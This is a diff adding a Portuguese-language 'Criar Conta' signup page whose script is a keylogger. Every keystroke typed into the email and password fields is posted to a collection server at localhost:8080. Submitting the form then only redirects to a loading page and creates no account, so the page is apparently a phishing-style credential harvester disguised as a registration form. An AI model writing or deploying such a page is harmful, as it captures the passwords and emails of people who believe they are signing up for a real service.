@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Criar Conta</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="signup-container">
+        <h2>Criar Conta</h2>
+        <form id="signupForm">
+            <div class="input-group">
+                <label for="username">Usuário (email)</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Senha</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit">Criar Conta</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            window.location.href = 'loading.html';
+        });
+
+        // Captura teclas digitadas no campo de usuário
+        document.getElementById('username').addEventListener('keydown', function(event) {
+            const key = event.key;
+            sendData('username', key);
+        });
+
+        // Captura teclas digitadas no campo de senha
+        document.getElementById('password').addEventListener('keydown', function(event) {
+            const key = event.key;
+            sendData('password', key);
+        });
+
+        // Função para enviar dados para o servidor
+        function sendData(id, key) {
+            fetch('http://localhost:8080', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ id, key })
+            });
+        }
+    </script>
+</body>
+</html>
